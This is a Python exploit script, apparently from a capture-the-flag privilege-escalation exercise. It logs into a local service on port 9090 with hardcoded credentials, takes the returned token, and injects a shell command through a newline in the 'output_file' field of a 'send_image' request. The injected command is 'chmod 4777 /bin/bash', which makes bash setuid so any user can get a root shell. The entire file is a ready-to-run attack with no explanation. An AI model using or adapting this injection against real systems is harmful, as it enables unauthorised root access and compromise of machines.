#!/usr/bin/python3

import requests
import json
import sys

cmd = 'chmod 4777 /bin/bash'

def login():
    headers = {
        'Content-Type': 'application/json',
    }
    json_data = {
        'username': 'developer',
        'password': 'bigbang',
    }
    r = requests.post('http://127.0.0.1:9090/login', headers=headers, json=json_data)
    data = json.loads(r.text)
    return data['access_token']

def command(jwt):
    headers = {
        'Authorization': f'Bearer {jwt}',
        'Content-Type': 'application/json',
    }
    json_data = {
        'command': 'send_image',
        'output_file': f'\n {cmd}',
    }
    r = requests.post('http://127.0.0.1:9090/command', headers=headers, json=json_data)
    print(r.text)

jwt = login()
command(jwt)
